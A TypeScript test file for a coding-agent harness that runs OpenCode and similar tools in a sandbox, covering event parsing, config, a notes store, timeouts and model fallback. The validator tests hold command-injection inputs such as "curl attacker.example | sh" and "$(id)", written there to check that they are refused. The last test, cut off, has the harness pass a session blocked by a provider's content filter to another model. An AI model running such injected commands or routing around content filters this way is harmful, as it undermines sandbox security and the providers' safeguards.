import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type { ExecResult } from "@galahad/core";
import { AGENT_DIR, AGENTS, type AgentEvent, chooseAgentModels, OPENCODE, OWN_SIGN_IN, runAgent } from "../src/agents.ts";
import { ENGRAM_ENV, engramArgv, engramBriefing } from "../src/engram.ts";
import { type QuestEvent, type QuestRole, runQuest } from "../src/quest.ts";

/*
 * Coding agents: OpenCode's event stream as Galahad reads it (lines captured from a
 * real run in a microVM, trimmed), and the runner driven against a fake sandbox that
 * plays the background process.
 */

const SESSION = "ses_e3b7b5785ffeWOUAvU1UHA94R4";
const line = (type: string, part: object) => JSON.stringify({ type, timestamp: 1794298395235, sessionID: SESSION, part: { sessionID: SESSION, ...part } });
const LINES = {
  start: line("step_start", { type: "step-start" }),
  shell: line("tool_use", {
    type: "tool",
    tool: "shell",
    state: { status: "completed", input: { command: "python3 test_calc.py", workdir: "/work/repo" }, output: "ok\n", metadata: { metadata: { status: "completed", exit: 0 } } },
  }),
  failing: line("tool_use", {
    type: "tool",
    tool: "shell",
    state: { status: "completed", input: { command: "python3 test_calc.py" }, output: "AssertionError", metadata: { metadata: { exit: 1 } } },
  }),
  edit: line("tool_use", { type: "tool", tool: "edit", state: { status: "completed", input: { filePath: "/work/repo/calc.py", oldString: "a - b", newString: "a + b" }, output: "" } }),
  running: line("tool_use", { type: "tool", tool: "shell", state: { status: "running", input: { command: "sleep 1" } } }),
  finish: line("step_finish", { type: "step-finish", reason: "tool-calls", tokens: { input: 8140, output: 94 } }),
  text: line("text", { type: "text", text: "`python3 test_calc.py` now passes. The bug was `a - b`; it's `a + b` now." }),
};

describe("reading OpenCode", () => {
  test("its events: the session, commands and edits with their outcome, tokens, and its last words", () => {
    const events = Object.values(LINES).flatMap((l) => OPENCODE.read(l)).filter((e) => e.type !== "session");
    expect(events).toEqual([
      { type: "tool", tool: "shell", input: "python3 test_calc.py", output: "ok\n", ok: true },
      { type: "tool", tool: "shell", input: "python3 test_calc.py", output: "AssertionError", ok: false },
      { type: "tool", tool: "edit", input: JSON.stringify({ filePath: "/work/repo/calc.py", oldString: "a - b", newString: "a + b" }), output: "", ok: true },
      { type: "tokens", input: 8140, output: 94 },
      { type: "text", text: "`python3 test_calc.py` now passes. The bug was `a - b`; it's `a + b` now." },
    ]);
    expect(OPENCODE.read(LINES.start)).toEqual([{ type: "session", id: SESSION }]);
    // As seen live: a provider's filter is a failure with a reason.
    expect(OPENCODE.read(JSON.stringify({ type: "provider.content-filter", message: "Provider blocked the response" }))).toEqual([{ type: "error", message: "Provider blocked the response" }]);
    expect(OPENCODE.read("not json")).toEqual([]);
  });

  test("its config: every model through the gateway (never a key), no self-updates, every tool allowed", () => {
    const files = OPENCODE.files([
      { provider: "orcarouter", model: "anthropic/claude-opus-5.5" },
      { provider: "deepseek", model: "deepseek-v4-pro" },
    ]);
    const config = JSON.parse(files["/work/.config/opencode/opencode.json"]!);
    expect(config.model).toBe("g-orcarouter/anthropic/claude-opus-5.5");
    expect(config.update).toBe("disable");
    expect(config.providers["g-orcarouter"].settings).toEqual({ baseURL: "{env:GALAHAD_GATEWAY}/orcarouter", apiKey: "{env:OPENAI_API_KEY}" });
    expect(config.providers["g-deepseek"].settings).toEqual({ baseURL: "{env:GALAHAD_GATEWAY}/deepseek", apiKey: "{env:OPENAI_API_KEY}" });
    expect(Object.keys(config.providers["g-deepseek"].models)).toEqual(["deepseek-v4-pro"]);
    expect(config.permissions).toEqual([{ action: "*", resource: "*", effect: "allow" }]);
  });

  test("its models: the engineer's, in the roster's order, on OpenAI-compatible providers with a key", () => {
    const providers = [
      { id: "anthropic", kind: "anthropic", hasKey: true },
      { id: "orcarouter", kind: "openai", hasKey: true },
      { id: "deepseek", kind: "openai", hasKey: false },
    ];
    const withDeepseek = providers.map((p) => (p.id === "deepseek" ? { ...p, hasKey: true } : p));
    expect(chooseAgentModels(["anthropic/claude-opus-5-5", "ollama/*", "orcarouter/anthropic/claude-opus-5.5", "deepseek/deepseek-v4-pro"], withDeepseek)).toEqual([
      { provider: "orcarouter", model: "anthropic/claude-opus-5.5" },
      { provider: "deepseek", model: "deepseek-v4-pro" },
    ]);
    expect(chooseAgentModels(["deepseek/v4", "orcarouter/x"], providers)).toEqual([{ provider: "orcarouter", model: "x" }]);
    expect(chooseAgentModels(["anthropic/claude-opus-5-5"], providers)).toEqual([]);
  });

  test("a run continues its session when there is one", () => {
    expect(OPENCODE.command({ provider: "p", model: "m" }, null)).not.toContain("--session");
    expect(OPENCODE.command({ provider: "p", model: "m" }, SESSION)).toContain(`--session '${SESSION}'`);
    expect(OPENCODE.command({ provider: "orcarouter", model: "anthropic/claude-opus-5.5" }, null)).toContain("--model 'g-orcarouter/anthropic/claude-opus-5.5'");
  });
});

/*
 * The VM's notes store (engram.ts): a driver is given its project only when a task has the store, and
 * then says so in the tool's own way. Without one, nothing of the store is in anything a driver makes.
 */
describe("a driver and the notes store", () => {
  const MODELS = [{ provider: "orcarouter", model: "anthropic/claude-opus-5.5" }, { provider: "deepseek", model: "deepseek-v4-pro" }];
  /** Everything a driver writes into a VM and runs there (the store changes only what is written: a command says nothing of it). */
  const made = (driver: (typeof AGENTS)[string], engram?: string) => JSON.stringify([driver.files(MODELS, engram), driver.command(MODELS[0]!, null), driver.command(MODELS[1]!, SESSION), driver.command(OWN_SIGN_IN, null), driver.check]);
  const sha256 = (text: string) => new Bun.CryptoHasher("sha256").update(text).digest("hex");
  /**
   * The SHA-256 of that for each driver as it was before the store existed (commit 6bbab45, 14 November 2026). Hermes'
   * was made again on 19 November 2026, when its bridge came to share Galahad's ACP client (acp.ts): its text, not its
   * protocol or what it does (hermes.test.ts, and the real Hermes 0.21.1's check); and again that day, when its run lost
   * the tool budget and time limit of its own that a knight's never has (an asked-for one still holds: hermes.test.ts).
   * Claude Code's and Codex's were made again on 21 November 2026, when Codex came to say its plan's spent allowance as
   * Claude Code says one, both bridges sharing the words for when it resets: their text (vendor-cli.test.ts), not what
   * either runs or writes; and Codex's again that day, when its reconnections came to be said as retries.
   */
  const BEFORE: Record<string, string> = {
    opencode: "2a533082929650be330eb0ee7397582382a74884cb93250708e9b4688c884fe7",
    hermes: "999c1f0048099249e548e34b7ece5708db0bc8ae51fe7c528f67a3f3a621d98a",
    claude: "21af2ea71dbfb2646ca1f0b0639d81a3fdd1bd6b796658fd85f50c0def23af43",
    codex: "ffc6aa8550b8d7fc80dac00aa228c2910271ebd1ad6ef077da6e07cc7bee5de7",
  };

  test("without a notes project, every driver writes and runs byte for byte what it did before there was a store", () => {
    expect(Object.keys(AGENTS).sort()).toEqual(Object.keys(BEFORE).sort());
    for (const [name, driver] of Object.entries(AGENTS)) {
      expect([name, sha256(made(driver))]).toEqual([name, BEFORE[name]!]);
      expect([name, made(driver, undefined)]).toEqual([name, made(driver)]);
      expect([name, made(driver).includes("engram")]).toEqual([name, false]);
    }
  });

  test("with one, every driver names the binary by its absolute path, exactly the four tools and the pinned project, and nothing that reaches outside the VM", () => {
    for (const [name, driver] of Object.entries(AGENTS)) {
      const text = made(driver, "you-project");
      expect([name, sha256(text) === BEFORE[name]]).toEqual([name, false]);
      expect([name, text.includes("/opt/engram/bin/engram")]).toEqual([name, true]);
      expect([name, (text.match(/--tools=[a-z_,]+/g) ?? []).every((tools) => tools === "--tools=mem_search,mem_get_observation,mem_save,mem_update")]).toEqual([name, true]);
      expect([name, text.includes("--tools=")]).toEqual([name, true]);
      expect([name, text.includes("you-project")]).toEqual([name, true]);
      expect([name, text.includes("/work/.memory/engram")]).toEqual([name, true]);
      expect([name, text.includes("ENGRAM_NO_UPDATE_CHECK")]).toEqual([name, true]);
      expect([name, /ENGRAM_CLOUD|ENGRAM_URL|7437|mem_(context|session|judge|delete|merge|save_prompt)/.test(text)]).toEqual([name, false]);
      // The project is a second knight's or a second repository's: nothing else of what is made changes with it.
      expect([name, made(driver, "other-repo")]).toEqual([name, text.replaceAll("you-project", "other-repo")]);
    }
  });

  test("a project's name that isn't one is refused by every driver before anything is made of it", () => {
    for (const [name, driver] of Object.entries(AGENTS)) {
      for (const hostile of ["You Project", "a'; curl attacker.example | sh #", "--tools=agent", "$(id)", "a\nb", "x".repeat(65)]) {
        expect(() => [name, driver.files(MODELS, hostile)]).toThrow("not a notes project");
      }
    }
  });

  test("OpenCode: its config gains one local MCP server, as its own `mcp add` writes one, and is otherwise what it was", () => {
    const plain = JSON.parse(OPENCODE.files(MODELS)["/work/.config/opencode/opencode.json"]!);
    const files = OPENCODE.files(MODELS, "you-project");
    expect(Object.keys(files)).toEqual(["/work/.config/opencode/opencode.json"]);
    const { mcp, ...rest } = JSON.parse(files["/work/.config/opencode/opencode.json"]!);
    expect(rest).toEqual(plain);
    expect(mcp).toEqual({ servers: { engram: { type: "local", command: engramArgv("you-project"), environment: { ...ENGRAM_ENV } } } });
  });

  test("no driver names a file a vendor's tool keeps its own configuration in: nothing of the store is written there", () => {
    for (const file of ["agents.ts", "acp.ts", "hermes.ts", "vendor-cli.ts", "engram.ts", "quest.ts", "agent-process.ts"]) {
      const source = readFileSync(new URL(`../src/${file}`, import.meta.url), "utf8");
      expect([file, /\.claude\.json|config\.toml|\.codex\/|settings\.json|claude mcp add|plugin (install|add|marketplace)/.test(source)]).toEqual([file, false]);
    }
  });
});

/** A sandbox that plays a background agent: each poll returns the next batch of lines; then it exits. */
function sandbox(batches: string[][], exit: number | null = 0, options: { stderr?: string; forever?: boolean } = {}) {
  const commands: string[] = [];
  let polls = 0;
  let offset = 0;
  const exec = async (command: string): Promise<ExecResult> => {
    commands.push(command);
    const ok = (stdout = "") => ({ exitCode: 0, stdout, stderr: "", durationMs: 1, truncated: false });
    if (command.startsWith("python3 -c") && command.includes("d, off =")) {
      const batch = batches[polls] ?? [];
      polls += 1;
      const alive = options.forever || polls < batches.length;
      offset += batch.join("\n").length + (batch.length ? 1 : 0);
      return ok(JSON.stringify({ alive, exit: alive ? null : exit, next: offset, lines: batch }));
    }
    if (command.startsWith("stat -c")) return ok("0\n");
    if (command.startsWith("tail -c 2000")) return ok(options.stderr ?? "");
    return ok();
  };
  return { exec, commands };
}

const model = { provider: "orcarouter", model: "anthropic/claude-opus-5.5" };
const noSleep = async () => {};

describe("running an agent", () => {
  test("an agent that finishes during launch still reports its session and result", async () => {
    let launched = false;
    const early = [LINES.start, LINES.text];
    const bytes = early.join("\n").length + 1;
    const exec = async (command: string): Promise<ExecResult> => {
      let stdout = "";
      if (command.startsWith("mkdir -p")) launched = true;
      if (command.startsWith("stat -c")) stdout = String(launched ? bytes : 0);
      if (command.startsWith("python3 -c") && command.includes("d, off =")) {
        const offset = Number(command.split(" ").at(-1));
        stdout = JSON.stringify({ alive: false, exit: 0, next: bytes, lines: offset < bytes ? early : [] });
      }
      return { exitCode: 0, stdout, stderr: "", durationMs: 1, truncated: false };
    };
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Date.now() + 60_000, workdir: "/work" }, { exec, sleep: noSleep });
    expect(run.session).toBe(SESSION);
    expect(run.summary).toContain("now passes");
  });

  test("started in the background with stdin closed, followed to the end, its last words its summary", async () => {
    const box = sandbox([[LINES.start, LINES.shell], [LINES.edit, LINES.finish], [LINES.text]]);
    const seen: AgentEvent[] = [];
    const run = await runAgent(OPENCODE, { model, prompt: "Fix it ‘now’", session: null, deadline: Date.now() + 60_000, workdir: "/work/repo" }, { exec: box.exec, sleep: noSleep, event: (e) => seen.push(e) });
    expect(run).toMatchObject({ status: "finished", steps: 2, session: SESSION, tokens: { input: 8140, output: 94 } });
    expect(run.summary).toContain("now passes");
    const launch = box.commands.find((c) => c.startsWith("mkdir -p"))!;
    expect(launch).toContain(`base64 -d > ${AGENT_DIR}/prompt.md`);
    expect(launch).toContain("cd '/work/repo'");
    expect(launch).toContain("setsid bash -c");
    expect(launch).toContain("< /dev/null");
    expect(Buffer.from(launch.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8")).toBe("Fix it ‘now’");
    expect(seen.filter((e) => e.type === "tool")).toHaveLength(2);
  });

  test("every command it sends the sandbox is valid shell (seen live: `… & && echo $!` broke the launch)", async () => {
    const box = sandbox([[LINES.start], [LINES.shell]], null, { forever: true });
    let t = 0;
    await runAgent(OPENCODE, { model, prompt: "it's \"quoted\" & $(dangerous)", session: SESSION, deadline: 15_000, workdir: "/work/my repo" }, { exec: box.exec, sleep: noSleep, now: () => (t += 10_000) });
    const kinds = new Set(box.commands.map((c) => c.split(" ")[0]));
    expect([...kinds].sort()).toEqual(["mkdir", "python3", "stat"]);
    for (const command of box.commands) {
      const check = Bun.spawnSync(["bash", "-n", "-c", command]);
      expect({ command: command.slice(0, 120), stderr: check.stderr.toString() }).toEqual({ command: command.slice(0, 120), stderr: "" });
    }
  });

  test("a run that can't start says why in its first line: a traceback's exception, not its heading", async () => {
    // On 22 November 2026 a knight's trail said only "couldn't start opencode: Traceback (most recent call last):".
    const exec = async (command: string): Promise<ExecResult> => {
      if (command.startsWith("mkdir -p")) return { exitCode: 1, stdout: "", stderr: "Traceback (most recent call last):\n  File \"<string>\", line 3, in <module>\nFileNotFoundError: [Errno 2] No such file or directory: '/work/.galahad-gateway.json'", durationMs: 1, truncated: false };
      return { exitCode: 0, stdout: command.startsWith("stat -c") ? "0\n" : "", stderr: "", durationMs: 1, truncated: false };
    };
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Date.now() + 60_000, workdir: "/work" }, { exec, sleep: noSleep });
    expect(run.status).toBe("failed");
    expect(run.error!.split("\n")[0]).toBe("couldn't start opencode: FileNotFoundError: [Errno 2] No such file or directory: '/work/.galahad-gateway.json'");
    expect(run.error).toContain('File "<string>", line 3');
  });

  test("a failed run says why: its exit, its last error, its stderr", async () => {
    const box = sandbox([[LINES.start]], 1, { stderr: "provider galahad: 401 unknown token" });
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Date.now() + 60_000, workdir: "/work" }, { exec: box.exec, sleep: noSleep });
    expect(run.status).toBe("failed");
    expect(run.error).toContain("exited with 1");
    expect(run.error).toContain("401 unknown token");
  });

  test("a run that can't be read for five minutes is stopped and failed, saying why, never waited on for ever", async () => {
    // On 22 November 2026 a knight deleted its lease, every command in its VM failed from then on, and its task waited
    // on a run that had ended: each look that failed was taken as no news.
    const commands: string[] = [];
    let t = 0;
    const exec = async (command: string): Promise<ExecResult> => {
      commands.push(command);
      if (command.startsWith("python3 -c") && command.includes("d, off =")) return { exitCode: 1, stdout: "", stderr: "Traceback (most recent call last):\nFileNotFoundError: [Errno 2] No such file or directory: '/work/.galahad-gateway.json'", durationMs: 1, truncated: false };
      return { exitCode: 0, stdout: command.startsWith("stat -c") ? "0\n" : "", stderr: "", durationMs: 1, truncated: false };
    };
    // (Time moves as it waits between looks, ten seconds each.)
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Number.MAX_SAFE_INTEGER, workdir: "/work" }, { exec, sleep: async (ms) => void (t += ms), now: () => t });
    expect(run.status).toBe("failed");
    expect(run.error).toBe("Galahad couldn't read how its run was going for 5 minutes, so it was stopped: FileNotFoundError: [Errno 2] No such file or directory: '/work/.galahad-gateway.json'");
    // About five minutes of looks, ten seconds apart, and its whole process group stopped.
    expect(commands.filter((c) => c.includes("d, off =")).length).toBeGreaterThan(25);
    expect(commands.filter((c) => c.includes("d, off =")).length).toBeLessThan(35);
    expect(commands.some((c) => c.startsWith("python3 -c") && c.includes("cleanup(sys.argv[1])"))).toBe(true);
  });

  test("a look that fails now and then is no news: the run goes on, and ends as it ends", async () => {
    let looks = 0;
    const box = sandbox([[LINES.start], [LINES.text]]);
    const exec = async (command: string, timeout: number): Promise<ExecResult> => {
      if (command.includes("d, off =") && ++looks % 2 === 1) return { exitCode: 1, stdout: "", stderr: "a hiccup", durationMs: 1, truncated: false };
      return box.exec(command);
    };
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Number.MAX_SAFE_INTEGER, workdir: "/work" }, { exec, sleep: noSleep });
    expect(run).toMatchObject({ status: "finished", session: SESSION });
  });

  test("past its deadline it's stopped, its whole process group", async () => {
    const box = sandbox([[LINES.start], [LINES.shell]], null, { forever: true });
    let t = 0;
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: 25_000, workdir: "/work" }, { exec: box.exec, sleep: noSleep, now: () => (t += 10_000) });
    expect(run.status).toBe("timeout");
    expect(box.commands.some((c) => c.startsWith("python3 -c") && c.includes("cleanup(sys.argv[1])"))).toBe(true);
  });

  test("stopped by you: it's stopped", async () => {
    const controller = new AbortController();
    controller.abort();
    const box = sandbox([[LINES.start]], null, { forever: true });
    const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Date.now() + 60_000, workdir: "/work" }, { exec: box.exec, sleep: noSleep, signal: controller.signal });
    expect(run.status).toBe("stopped");
  });

  test("abort during launch awaits trusted cleanup even when the normal exec transport rejects", async () => {
    const controller = new AbortController();
    let cleaned = false;
    const exec = async (command: string): Promise<ExecResult> => {
      if (command.startsWith("mkdir -p")) {
        controller.abort();
        throw new Error("the request ended after the worker started");
      }
      if (controller.signal.aborted) throw new Error("ordinary commands are now refused");
      return { exitCode: 0, stdout: "0", stderr: "", durationMs: 1, truncated: false };
    };
    const result = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Date.now() + 60_000, workdir: "/work" }, {
      exec, sleep: noSleep, signal: controller.signal,
      stopAgent: async () => { await Promise.resolve(); cleaned = true; },
    }).catch(() => ({ status: "threw" }));
    expect(cleaned).toBe(true);
    expect(result.status).toBe("stopped");
  });
});

describe("a quest with a coding agent", () => {
  test("a resumed task uses its saved harness session and persists a newly observed session before review", async () => {
    const box = sandbox([[LINES.start, LINES.text]]);
    const saved: string[] = [];
    const outcome = await runQuest({ goal: "continue", environment: "a sandbox", plan: "Continue the task", agent: { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work", session: "saved-session" } }, {
      exec: box.exec, sleep: noSleep,
      agentSession: async (id) => { await Promise.resolve(); saved.push(id); },
      ask: async () => { expect(saved).toEqual([SESSION]); return { text: "PASS", model: "test/reviewer" }; },
    });
    expect(outcome.status).toBe("done");
    expect(box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))).toContain("--session");
    expect(box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))).toContain("saved-session");
    expect(saved).toEqual([SESSION]);
  });

  test("plan, the agent's run, an independent review; the reviewer's notes continue the agent's session", async () => {
    const replies: Record<QuestRole, string[]> = { planner: ["1. Fix calc.py.\nDone when: the test passes."], engineer: [], reviewer: ["REVISE\nAlso add a test for negative numbers.", "PASS\nBoth tests pass in the sandbox."] };
    const box = sandbox([[LINES.start, LINES.shell, LINES.text]]);
    let runs = 0;
    const commands: string[] = [];
    const exec = async (command: string) => {
      commands.push(command);
      if (command.startsWith("mkdir -p /work/.agent")) runs += 1;
      if (runs === 2 && command.startsWith("python3 -c") && command.includes("d, off =")) {
        return { exitCode: 0, stdout: JSON.stringify({ alive: false, exit: 0, next: 9999, lines: [LINES.edit, LINES.text] }), stderr: "", durationMs: 1, truncated: false };
      }
      return box.exec(command);
    };
    const asked: QuestRole[] = [];
    const events: QuestEvent[] = [];
    const outcome = await runQuest(
      { goal: "make the test pass", environment: "a sandbox", evidence: ["cd /work/repo && git diff --stat"], agent: { driver: OPENCODE, models: [model], minutes: 30, workdir: "/work/repo" } },
      {
        ask: async (role) => {
          asked.push(role);
          return { text: replies[role].shift()!, model: `test/${role}` };
        },
        exec,
        emit: (e) => events.push(e),
        sleep: noSleep,
      },
    );
    expect(outcome).toMatchObject({ status: "done", revisions: 1, steps: 2 });
    expect(asked).toEqual(["planner", "reviewer", "reviewer"]);
    // Its config was written first; the second run continued the session with the reviewer's notes.
    expect(commands[0]).toContain("/work/.config/opencode/opencode.json");
    const launches = commands.filter((c) => c.startsWith("mkdir -p /work/.agent"));
    expect(launches[1]).toContain(`--session`);
    const second = Buffer.from(launches[1]!.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
    expect(second).toContain("Also add a test for negative numbers.");
    // The reviewer saw the evidence from the sandbox.
    expect(commands).toContain("cd /work/repo && git diff --stat");
    for (const command of commands) expect(Bun.spawnSync(["bash", "-n", "-c", command]).stderr.toString()).toBe("");
    expect(events.some((e) => e.type === "command" && e.command === "shell: python3 test_calc.py")).toBe(true);
  });
});

describe("a bare coding tool", () => {
  test("as a person runs it: no plan, no reviewer; what it says is done is done, and its brief names neither", async () => {
    const box = sandbox([[LINES.start, LINES.shell, LINES.edit, LINES.text]]);
    const asked: QuestRole[] = [];
    const events: QuestEvent[] = [];
    const outcome = await runQuest(
      { goal: "make the test pass", environment: "a sandbox", plan: "", unreviewed: true, agent: { driver: OPENCODE, models: [model], minutes: 30, workdir: "/work/repo" } },
      { ask: async (role) => (asked.push(role), { text: "PASS", model: `test/${role}` }), exec: box.exec, emit: (e) => events.push(e), sleep: noSleep },
    );
    expect([outcome.status, outcome.revisions, outcome.review]).toEqual(["done", 0, undefined]);
    // None of Galahad's models was asked anything: the tool did the work, and its own word ended it.
    expect(asked).toEqual([]);
    expect(events.filter((e) => e.type === "plan" || e.type === "review")).toEqual([]);
    const launch = box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))!;
    const brief = Buffer.from(launch.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
    expect(brief).toStartWith("Quest: make the test pass\n\nYou are working in: a sandbox\n");
    expect(brief).not.toMatch(/\bplan(ner)?\b|\breviewer\b/i);
  });
});

describe("a quest with the notes store", () => {
  /** What a command wrote into the sandbox through base64 (a driver's file, an agent's message). */
  const decoded = (command: string) => Buffer.from(command.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
  const agent = { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work/repo" };

  test("a coding agent is written the store's entry and told how far to trust a note; without the store neither is anywhere", async () => {
    const run = async (engram?: string) => {
      const box = sandbox([[LINES.start, LINES.text]]);
      const outcome = await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", agent, ...(engram ? { engram } : {}) }, { exec: box.exec, sleep: noSleep, ask: async () => ({ text: "PASS", model: "test/reviewer" }) });
      expect(outcome.status).toBe("done");
      return { config: JSON.parse(decoded(box.commands[0]!)), message: decoded(box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))!), commands: box.commands };
    };
    const given = await run("you-project");
    expect(given.config.mcp).toEqual({ servers: { engram: { type: "local", command: engramArgv("you-project"), environment: { ...ENGRAM_ENV } } } });
    expect(given.message).toContain(engramBriefing("you-project", "tools"));
    expect(given.message).not.toContain("engram search");
    for (const command of given.commands) expect(Bun.spawnSync(["bash", "-n", "-c", command]).stderr.toString()).toBe("");
    const plain = await run();
    expect(plain.config.mcp).toBeUndefined();
    expect(plain.message).not.toMatch(/Notes store|engram/i);
    // The briefing is otherwise the same: the store adds one paragraph and takes nothing away.
    expect(given.message.replace(`\n\n${engramBriefing("you-project", "tools")}`, "")).toBe(plain.message);
  });

  test("the engineer's own loop is told the store's two shell commands, and its commands are run as it wrote them", async () => {
    const run = async (engram?: string) => {
      const asked: { role: QuestRole; text: string }[] = [];
      const commands: string[] = [];
      const replies: Record<QuestRole, string[]> = { planner: [], engineer: ["Look first.\n```sh\nengram search build commands --limit 5\n```", "DONE\nNothing to do."], reviewer: ["PASS"] };
      await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", ...(engram ? { engram } : {}) }, {
        ask: async (role, messages) => { asked.push({ role, text: messages[0]!.content }); return { text: replies[role].shift()!, model: `test/${role}` }; },
        exec: async (command) => { commands.push(command); return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; },
      });
      return { briefing: asked.find((a) => a.role === "engineer")!.text, review: asked.find((a) => a.role === "reviewer")!.text, commands };
    };
    const given = await run("you-project");
    expect(given.briefing).toContain(engramBriefing("you-project", "commands"));
    expect(given.briefing).not.toContain("MCP");
    // (Where the store is and which project is the sandbox's to say: whoever runs the quest's commands puts that before each.)
    expect(given.commands).toEqual(["engram search build commands --limit 5"]);
    // The reviewer judges the evidence: it is told nothing of the store.
    expect(given.review).not.toContain("Notes store");
    const plain = await run();
    expect(plain.briefing).not.toMatch(/Notes store|engram/i);
    expect(given.briefing.replace(`\n\n${engramBriefing("you-project", "commands")}`, "")).toBe(plain.briefing);
  });

  test("a project's name that isn't one ends the quest before anything is asked, written or run", async () => {
    let touched = 0;
    const deps = { ask: async () => { touched += 1; return { text: "PASS", model: "test" }; }, exec: async () => { touched += 1; return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; }, sleep: noSleep };
    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "you'; curl attacker.example | sh #", agent }, deps)).rejects.toThrow("not a notes project");
    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "--tools=agent" }, deps)).rejects.toThrow("not a notes project");
    expect(touched).toBe(0);
  });
});

/*
 * As OpenCode 2.3.0 printed them on 21 November 2026 (against a stand-in plan; trimmed): its own retry of a refusal,
 * with when it asks again, and a refusal it takes as final, its message inside the error.
 */
const RETRY = JSON.stringify({ type: "retry", timestamp: 1795277081670, sessionID: SESSION, messageID: "msg_1", attempt: 2, nextRetryAt: 1795277083839, error: { type: "provider.rate-limit", message: "Rate limit reached; try again in 2s", status: 429, response: { body: '{"error":{"message":"Rate limit reached; try again in 2s"}}' } } });
const SPENT = "opencode-go's allowance is spent until 23:01 UTC (33h 55m from now), as its provider said: Galahad's gateway passes it over until then.";
const QUOTA = JSON.stringify({ type: "error", timestamp: 1795277633426, sessionID: SESSION, error: { type: "provider.quota", message: SPENT, status: 402, response: { body: JSON.stringify({ error: { type: "galahad_gateway", message: SPENT } }) } } });

describe("an agent's model fails", () => {
  test("OpenCode's own retries are said on the trail, and a refusal it takes as final is said in its own words to the next model", async () => {
    expect(OPENCODE.read(RETRY)).toEqual([{ type: "session", id: SESSION }, { type: "retry", attempt: 2, error: "Rate limit reached; try again in 2s", waitMs: 2169 }]);
    expect(OPENCODE.read(QUOTA)).toEqual([{ type: "session", id: SESSION }, { type: "error", message: SPENT }]);
    const replies: Record<QuestRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
    let runs = 0;
    const launches: string[] = [];
    const exec = async (command: string): Promise<ExecResult> => {
      const ok = (stdout = "") => ({ exitCode: 0, stdout, stderr: "", durationMs: 1, truncated: false });
      if (command.startsWith("mkdir -p /work/.agent")) {
        runs += 1;
        launches.push(command);
        return ok();
      }
      if (command.startsWith("python3 -c") && command.includes("d, off =")) {
        return ok(JSON.stringify(runs === 1 ? { alive: false, exit: 1, next: 10, lines: [LINES.start, RETRY, LINES.shell, QUOTA] } : { alive: false, exit: 0, next: 20, lines: [LINES.edit, LINES.text] }));
      }
      return ok(command.startsWith("stat") ? "0" : "");
    };
    const events: QuestEvent[] = [];
    const outcome = await runQuest(
      { goal: "inventory", environment: "a sandbox", agent: { driver: OPENCODE, models: [model, { provider: "deepseek", model: "deepseek-v4-pro" }], minutes: 30, workdir: "/work/repo" } },
      { ask: async (role) => ({ text: replies[role].shift()!, model: `test/${role}` }), exec, emit: (e) => events.push(e), sleep: noSleep },
    );
    expect(outcome.status).toBe("done");
    const retries = events.filter((e) => e.type === "retry");
    // Its own wait, as it said it; then the next model taking over, told why in the plan's own words.
    expect(retries[0]).toEqual({ type: "retry", role: "engineer", attempt: 2, error: "Rate limit reached; try again in 2s", waitMs: 2169 });
    expect(retries[1]).toMatchObject({ role: "engineer", attempt: 1, error: expect.stringContaining(`orcarouter/anthropic/claude-opus-5.5: ${SPENT.slice(0, 60)}`) });
    const second = Buffer.from(launches[1]!.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
    expect(second).toContain(`Your last run stopped with an error (${SPENT}`);
    expect(second).not.toContain("provider.quota");
  });

  test("the next model carries on the same session (seen live: a provider's content filter ended the quest)", async () => {
    const replies: Record<QuestRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
    const filtered = JSON.stringify({ type: "provider.content-filter", message: "Provider blocked the response" });
    let runs = 0;
    const launches: string[] = [];
    const exec = async (command: string): Promise<ExecResult> => {
      const ok = (stdout = "") => ({ exitCode: 0, stdout, stderr: "", durationMs: 1, truncated: false });
      if (command.startsWith("mkdir -p /work/.agent")) {
        runs += 1;
        launches.push(command);
        return ok();
      }
      if (command.startsWith("python3 -c") && command.includes("d, off =")) {
        return ok(JSON.stringify(runs === 1 ? { alive: false, exit: 1, next: 10, lines: [LINES.start, LINES.shell, filtered] } : { alive: false, exit: 0, next: 20, lines: [LINES.edit, LINES.text] }));
      }
      return ok(command.startsWith("stat") ? "0" : "");
    };
    const events: QuestEvent[] = [];
    const outcome = await runQuest(
      {
        goal: "inventory",
        environment: "a sandbox",
        agent: { driver: OPENCODE, models: [model, { provider: "deepseek", model: "deepseek-v4-pro" }], minutes: 30, workdir: "/work/repo" },
      },
      { ask: async (role) => ({ text: replies[role].shift()!, model: `test/${role}` }), exec, emit: (e) => events.push(e), sleep: noSleep },
    );
    expect(outcome.status).toBe("done");
    expect(launches).toHaveLength(2);
    expect(launches[0]).toContain("g-orcarouter/anthropic/claude-opus-5.5");
    expect(launches[1]).toContain("g-deepseek/deepseek-v4-pro");
    expect(launches[1]).toContain("--session");
    expect(launches[1]).toContain(SESSION);
    const second = Buffer.from(launches[1]!.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
    expect(second).toContain("Continue the quest from where you left off");
    expect(second).toContain("Provider blocked the response");
